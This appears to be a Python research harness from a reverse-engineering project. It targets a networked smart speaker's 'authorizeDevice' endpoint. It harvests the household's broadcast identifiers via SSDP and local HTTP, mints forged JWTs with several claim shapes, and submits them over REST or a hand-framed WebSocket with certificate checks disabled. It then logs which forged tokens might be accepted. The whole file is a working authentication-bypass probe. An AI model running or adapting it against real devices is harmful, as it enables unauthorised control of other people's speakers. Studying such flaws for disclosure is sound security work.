#!/usr/bin/env python3
"""Burn candidate device tokens at the :1443 muse commander (`authorizeDevice`).

Facts this harness encodes (all proven, docs/RE_TOKEN.md 2026-11-03 (e)):
  * array-framed WS `[header, payload]` on /websocket/api, subprotocol
    v1.api.smartspeaker.audio, header `X-Sonos-Api-Key` = any uuid;
  * namespace `authorization`, command `authorizeDevice` (NOT
    `playerId,authorization`), payload `{grantType, assertion}`;
  * the bearer is the *header* field `authorization: Bearer <jwt>` — a nested
    `headers` object is ignored, and an empty value answers "Parsing terminated";
  * never pre-read the greeting: it swallows the response stream.

`systemId` is the claim the household-fingerprint gate really compares; the
composed value is device state, so the shapes carry composed fingerprints built
from the household's own broadcast identifiers.

The same handler answers over REST (`POST /api/v1/players/<playerId>/authorization/
authorizeDevice`, bearer in the HTTP `Authorization` header) — identical one-bit
verdict, no WS accept queue. MODE=rest (default) is the robust path; MODE=ws
exercises the commander framing.

usage: burn_authorize.py <ip>
       KIT_DIR=<dir with mint_jwt.py + keys>  SRC_IP=<bind address>  OUT=<jsonl log>
       MODE=ws
"""
import base64, json, os, socket, ssl, struct, subprocess, sys, time

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
D = os.environ.get("KIT_DIR", os.path.join(REPO, "captures", "research", "emudhra"))
KEY = "123e4567-e89b-12d3-a456-426655440000"
SUB = "v1.api.smartspeaker.audio"
URN = "urn:dev:ops:44974-zp-"
SCP = ["playback-control-all"]


def fetch(url):
    for _ in range(4):
        r = subprocess.run(["curl", "-s", "--max-time", "6", url], capture_output=True, text=True)
        if r.returncode == 0 and r.stdout:
            return r.stdout
        time.sleep(1.5)
    raise RuntimeError("no response from %s" % url)


def ssdp_infohash(ip):
    m = (b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\n'
         b'ST: urn:schemas-upnp-org:device:ZonePlayer:1\r\n\r\n')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.5)
    s.sendto(m, ("239.255.255.250", 1900))
    try:
        while True:
            d, a = s.recvfrom(4096)
            if a[0] != ip:
                continue
            for line in d.decode("latin1").split("\r\n"):
                if line.upper().startswith("X-SONOS-INFOHASH"):
                    return line.split(":", 1)[1].strip()
    except OSError:
        pass
    return ""


def info(ip):
    d = json.loads(fetch("http://%s:1400/info" % ip))
    zp = fetch("http://%s:1400/status/zp" % ip)

    def tag(name):
        i = zp.find("<%s>" % name)
        return zp[i + len(name) + 2:zp.find("</%s>" % name)] if i >= 0 else ""

    # playerId in the header must be the *object's* UDN: the unit's own, not the group's.
    return {"hh": d["householdId"], "hhid": d["householdId"].split(".")[0], "luid": tag("LocalUID"),
            "net": d["householdId"].rsplit("_", 1)[-1], "loc": tag("LocationId"),
            "serial": tag("SerialNumber"), "info": ssdp_infohash(ip)}


def mint(claims, x5c0=None):
    env = dict(os.environ)
    if x5c0:
        env["X5C0"] = x5c0
    return subprocess.run([sys.executable, D + "/mint_jwt.py", json.dumps(claims)],
                          capture_output=True, text=True, check=True, env=env).stdout.strip()


def connect(ip, timeout=15):
    raw = socket.socket()
    raw.settimeout(timeout)
    if os.environ.get("SRC_IP"):
        raw.bind((os.environ["SRC_IP"], 0))
    raw.connect((ip, 1443))
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers("DEFAULT@SECLEVEL=1")
    s = ctx.wrap_socket(raw)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET /websocket/api HTTP/1.1\r\nHost: %s:1443\r\nUpgrade: websocket\r\n"
               "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n"
               "Sec-WebSocket-Protocol: %s\r\nX-Sonos-Api-Key: %s\r\n\r\n")
              % (ip, k, SUB, KEY).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        c = s.recv(4096)
        if not c:
            raise RuntimeError("eof during handshake")
        buf += c
    if b" 101 " not in buf.split(b"\r\n")[0]:
        raise RuntimeError("handshake refused: %r" % buf[:120])
    return s


def send(s, text):
    p = text.encode()
    hdr = bytearray([0x81])
    if len(p) < 126:
        hdr.append(0x80 | len(p))
    elif len(p) < 65536:
        hdr.append(0x80 | 126)
        hdr += struct.pack(">H", len(p))
    else:
        hdr.append(0x80 | 127)
        hdr += struct.pack(">Q", len(p))
    m = os.urandom(4)
    hdr += m
    s.sendall(bytes(hdr) + bytes(b ^ m[i % 4] for i, b in enumerate(p)))


def recv_text(s, timeout=6):
    s.settimeout(timeout)
    out = b""
    while True:
        buf = b""
        while len(buf) < 2:
            buf += s.recv(2 - len(buf))
        ln, o, hdr = buf[1] & 0x7F, 2, buf
        if ln == 126:
            while len(hdr) < 4:
                hdr += s.recv(4 - len(hdr))
            ln, o = struct.unpack(">H", hdr[2:4])[0], 4
        elif ln == 127:
            while len(hdr) < 10:
                hdr += s.recv(10 - len(hdr))
            ln, o = struct.unpack(">Q", hdr[2:10])[0], 10
        body = b""
        while len(body) < o + ln:
            body += s.recv(o + ln - len(body))
        op, data = hdr[0] & 0x0F, body[o:]
        if op in (1, 0):
            out += data
            return out.decode("utf8", "replace")


def burn_rest(ip, player, hh, jwt, n):
    body = json.dumps({"grantType": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt})
    cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST", "-H", "X-Sonos-Api-Key: " + KEY,
           "-H", "Content-Type: application/json", "-H", "Authorization: Bearer " + jwt,
           "-d", body, "https://%s:1443/api/v1/players/%s/authorization/authorizeDevice" % (ip, player)]
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def main(ip):
    e = info(ip)
    hl = e["hh"].split(".")[1].split("_")[0]          # household luid (mhhid middle segment)
    print("target", ip, "luid", e["luid"], "hh-luid", hl, "hhid", e["hhid"], "net", e["net"])

    def fp(hhid, luid, net):
        return json.dumps({"owner": {"luid": luid}, "hhid": hhid, "network_hash": net},
                          separators=(",", ":"))

    desc = "http://127.0.0.1:1400/xml/device_description.xml"
    shapes = [
        ("A iss=urn+LocalUID systemId=composed(luid=hh-luid)", URN + e["luid"], fp(e["hhid"], hl, e["net"]), desc),
        ("B iss=urn+LocalUID systemId=composed(luid=LocalUID)", URN + e["luid"], fp(e["hhid"], e["luid"], e["net"]), desc),
        ("C iss=urn+LocalUID systemId=composed(net=infohash)", URN + e["luid"], fp(e["hhid"], hl, e["info"]), desc),
        ("D iss=urn+LocalUID systemId=composed jti=urn+LocalUID", URN + e["luid"], fp(e["hhid"], hl, e["net"]), URN + e["luid"]),
        ("E iss=bare URN systemId=composed", URN, fp(e["hhid"], hl, e["net"]), desc),
        ("F garbage control", "Sonos", "nope", "x"),
    ]
    log = open(os.environ["OUT"], "a") if os.environ.get("OUT") else None
    for n, (label, iss, systemId, jti) in enumerate(shapes, 1):
        now = int(time.time())
        jwt = mint({"iss": iss, "systemId": systemId, "scp": SCP, "iat": now, "exp": now + 86400,
                    "riat": now, "rexp": now + 86400, "jti": jti, "sub": "probe", "aud": "Sonos"},
                   os.environ.get("X5C0"))
        if os.environ.get("MODE", "rest") == "rest":
            out = burn_rest(ip, e["luid"], e["hh"], jwt, n)
            s = None
        else:
            s = None
            for _ in range(4):
                try:
                    s = connect(ip)
                    break
                except Exception as ex:
                    err = ex
                    time.sleep(1.5)
            if s is None:
                print("CONNECT_ERR", label, err)
                continue
            hdr = {"namespace": "authorization", "command": "authorizeDevice", "playerId": e["luid"],
                   "householdId": e["hh"], "cmdId": n, "authorization": "Bearer " + jwt}
            body = {"grantType": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt,
                    "objectId": e["luid"], "objectType": "player"}
            out = ""
            try:
                send(s, json.dumps([hdr, body]))
                for _ in range(8):
                    out += recv_text(s, 8)
                    if "errorCode" in out or '"success":true' in out:
                        break
            except Exception as ex:
                out += " ERR %s" % ex
        i = out.find("errorCode")
        verdict = ("GRANT?" if "errorCode" not in out else
                   "RESOLVER_DOWN" if "Could not resolve" in out else "401")
        line = "%-12s %s :: %s" % (verdict, label, out[i:i + 120] if i >= 0 else out[:200])
        print(line)
        if log:
            log.write(json.dumps({"ts": time.time(), "ip": ip, "verdict": verdict, "shape": label,
                                  "iss": iss, "systemId": systemId, "jti": jti,
                                  "response": out}) + "\n")
            log.flush()
        try:
            s.close()
        except Exception:
            pass
    if log:
        log.close()


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "192.168.4.81")
